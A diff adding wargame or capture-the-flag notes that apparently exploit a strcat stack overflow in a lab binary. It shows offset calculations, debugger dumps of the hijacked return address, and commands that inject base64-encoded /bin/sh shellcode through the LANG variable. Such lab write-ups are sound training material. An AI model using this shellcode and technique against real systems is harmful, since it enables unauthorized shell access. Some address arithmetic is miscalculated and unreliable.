@@ -1,0 +1,98 @@
+# vim: ts=2 sw=2 et ai
+
+GLANCE:
+The buffer we want to overflow is `greetuser::greeting`.  The trick is to exploit
+the `strcat` function.
+
+`strcat` terminates only when it receives an 0x0.  So, we can create a greeting
+which is 40 long of non-null bytes, appended with any exploitable information.
+
+The buffer is lengthed 64, so even with the longest greeting (10 bytes) plus the
+`user.name`, it is insufficient to overflow.
+
+Just to help overflow, let's set:
+  > export LANG=de
+
+So the name we will set to:
+  'A' * 40
+
+To get to the `EIP`, we need:
+  11 comes from "Willkommen "
+  64 - 11 (prompt)
+     - 40 (name)
+     - 32
+
+We now have a maximum overflow of 19 bytes.  That's more than we require.
+
+We need only an overflow of:
+  64 (greeting)
+   4 (greeting ptr)
+   4 (user)
+   4 (stack frame above)
+    = 76
+
+So in the `password` field, we need:
+  76 - 11 - 40 = 25 bytes until we reach the the register.
+
+We can confirm with running:
+	# 40 * 'A' 25 * 'w' FFFF
+  > run AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA wwwwwwwwwwwwwwwwwwwwwwwwwFFFF
+
+Setting break point at: *greetuser+118
+	...
+	EBP: 0x77777777 ('wwww')
+	ESP: 0xbffffb6c ("FFFF")
+	EIP: 0x8048592 (<greetuser+118>:	ret)
+	EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
+	[-------------------------------------code-------------------------------------]
+	   0x8048589 <greetuser+109>:	mov    DWORD PTR [esp],eax
+	   0x804858c <greetuser+112>:	call   0x80483f0 <puts@plt>
+	   0x8048591 <greetuser+117>:	leave
+	=> 0x8048592 <greetuser+118>:	ret
+	   0x8048593 <main>:	push   ebp
+	   0x8048594 <main+1>:	mov    ebp,esp
+	   0x8048596 <main+3>:	push   edi
+	   0x8048597 <main+4>:	push   esi
+	[------------------------------------stack-------------------------------------]
+	0000| 0xbffffb6c ("FFFF")
+	0004| 0xbffffb70 --> 0x41414100 ('')
+	0008| 0xbffffb74 ('A' <repeats 36 times>, 'w' <repeats 25 times>, "FFFF")
+	0012| 0xbffffb78 ('A' <repeats 32 times>, 'w' <repeats 25 times>, "FFFF")
+	0016| 0xbffffb7c ('A' <repeats 28 times>, 'w' <repeats 25 times>, "FFFF")
+	0020| 0xbffffb80 ('A' <repeats 24 times>, 'w' <repeats 25 times>, "FFFF")
+	0024| 0xbffffb84 ('A' <repeats 20 times>, 'w' <repeats 25 times>, "FFFF")
+	0028| 0xbffffb88 ('A' <repeats 16 times>, 'w' <repeats 25 times>, "FFFF")
+
+We can confirm this by setting the second break point at: `*main+287`
+
+	...
+	EBP: 0x77777777 ('wwww')
+	ESP: 0xbffffb70 --> 0x41414100 ('')
+	EIP: 0x46464646 ('FFFF')
+	...
+	[-------------------------------------code-------------------------------------]
+	Invalid $PC address: 0x46464646
+	[------------------------------------stack-------------------------------------]
+
+***THIS*** is where we will inject a pointer to the injection.
+
+If you look at the memory addresses, you can find the pointer address:
+	EDX: 0xb7fc3870 --> 0x0
+	ESI: 0xbffffbdc --> 0xbfffff42 ("dejhh///sh/bin\211\343h\001\001\001\001\201\064$ri\001\001\061\311Qj\004Y\001\341Q\211\341\061\322j\vX\315\200")
+	EDI: 0xbffffb8c --> 0x80482da ("__libc_start_main")
+
+The address lies as (0xbfffff42 - 4) = 0xbfffff6e.
+
+
+---
+We now need to know where we can store the shell script.  The only option is to
+store it in the environmental variable.  So now we can add the shell injection code
+into the end.  We add two spaces to keep it 4 byte aligned.
+
+	export LANGE="de  ${SHELL_INJECTION_CODE}"
+
+You can run using:
+	> export LANG="de  $(echo -n 'amhoLy8vc2gvYmluieNoAQEBAYE0JHJpAQExyVFqBFkB4VGJ4THSagtYzYA=' | base64 -d)"
+	> run AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA wwwwwwwwwwwwwwwwwwwwwwwww$(echo -n 'Rv//vw==' | base64 -d)
+
+
